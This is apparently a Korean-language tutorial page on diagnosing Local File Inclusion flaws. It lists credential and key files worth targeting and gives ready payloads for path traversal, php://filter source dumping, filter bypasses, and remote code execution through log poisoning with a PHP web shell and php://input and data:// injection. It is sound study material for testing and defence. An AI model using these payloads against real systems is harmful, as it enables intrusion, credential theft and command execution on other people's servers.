---
sidebar_position: 2
title: Local File Inclusion (LFI)
---

# Local File Inclusion (LFI) 취약점 진단

## Overview

**LFI**: 웹 애플리케이션이 외부 사용자 입력을 통해 로컬 파일 시스템 내 파일을 동적으로 포함(Include)시킬 때, 필터링 부재로 인해 의도치 않은 시스템 민감 파일을 읽거나 코드를 실행하게 되는 취약점

- **발생 조건**: 경로 변경(`../`) 입력 허용, 웹 프로세스 읽기 권한, 파일 존재
- **위험성**: 시스템 민감 정보(설정 파일, 암호 해시, 개인키 등) 유출 및 RCE(Remote Code Execution) 연계 가능

---

## 1. Reconnaissance (타겟 파일 열거)

### 주요 시스템 및 설정 파일 (Linux)
```bash
/etc/passwd                   # 시스템 사용자 목록
/etc/shadow                   # 패스워드 해시 (루트 권한 필요)
/etc/hosts                    # 호스트 IP 매핑 정보
/etc/apache2/apache2.conf     # Apache 설정
/etc/nginx/nginx.conf         # Nginx 설정
/var/log/apache2/access.log   # Apache 접속 로그
/var/log/auth.log             # 인증 로그
```

### 주요 시스템 및 설정 파일 (Windows)
```bash
C:/boot.ini
C:/WINDOWS/System32/drivers/etc/hosts
C:/xampp/apache/logs/access.log     # XAMPP Apache 접속 로그
C:/Windows/Panther/Unattend.xml     # 무인 설치 응답 파일 (평문 암호 존재 가능)
```

### 사용자 민감 파일
```bash
~/.bash_history               # 쉘 명령어 히스토리
~/.ssh/id_rsa                 # SSH 개인키
~/.ssh/authorized_keys        # 허용된 SSH 공개키
/var/www/html/wp-config.php   # 워드프레스 설정 파일 (DB 크리덴셜)
```

---

## 2. Exploitation

### 기본 경로 탐색 (Path Traversal)
```bash
# 절대 경로 접근
http://<target>/index.php?file=/etc/passwd

# 상대 경로 접근 (Directory Traversal)
http://<target>/index.php?file=../../../../../../../../etc/passwd
```

### PHP Wrapper를 활용한 파일 읽기
`.php` 확장자가 자동으로 붙거나 렌더링되어 소스코드가 보이지 않을 때 Base64로 인코딩하여 출력
```bash
# php://filter를 이용해 소스코드를 Base64로 추출
http://<target>/index.php?file=php://filter/convert.base64-encode/resource=index.php

# 추출한 Base64 디코딩 (공격자 환경)
echo "<base64_string>" | base64 -d
```

### RCE (원격 코드 실행) 전환 공격
LFI를 통해 단순 파일 읽기를 넘어 시스템 명령을 실행하는 연계 공격

**1. Log Poisoning (로그 변조)**
웹 서버 로그 파일에 PHP 코드를 남기고, LFI로 해당 로그 파일을 호출하여 실행
```bash
# 1. User-Agent 헤더 등에 악성 PHP 코드 삽입 후 접근
curl -A "<?php system(\$_GET['cmd']); ?>" http://<target>/

# 2. LFI 취약점으로 로그 파일을 Include 하면서 명령어 전달
http://<target>/index.php?file=/var/log/apache2/access.log&cmd=whoami
```

**2. php://input 및 data:// 활용**
```bash
# POST body에 입력한 PHP 코드를 직접 실행
curl -X POST --data "<?php system('whoami'); ?>" "http://<target>/index.php?file=php://input"

# 데이터 URI를 통해 직접 Base64 인코딩된 코드 실행
# Base64: <?php system('id'); ?>
http://<target>/index.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

---

## 3. Advanced Techniques

### 필터링 우회 (Bypass) 기법
```bash
# 1. Null Byte 삽입 (PHP 5.3.4 이전 버전) - 강제 확장자 우회
http://<target>/index.php?file=../../../etc/passwd%00

# 2. 필터 제거 우회 (치환 필터가 한 번만 동작할 때)
....//....//....//etc/passwd

# 3. URL 인코딩 및 이중 인코딩
%2e%2e%2f                     # ../ (1차 인코딩)
%252e%252e%252f               # ../ (2차 인코딩)
```

### 헤더(Header) 기반 LFI (Django, Node.js 등)
일부 프레임워크 템플릿 처리 시 Accept 헤더 등에서 발생
```http
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%00
```

### LFI 자동화 도구
```bash
# [LFISuite] 자동화된 페이로드 주입 및 쉘 획득 도구
git clone https://github.com/D35m0nd142/LFISuite.git

# [dotdotpwn] Directory Traversal 퍼저
dotdotpwn -m http -h <target> -x 80 -f /etc/passwd
```
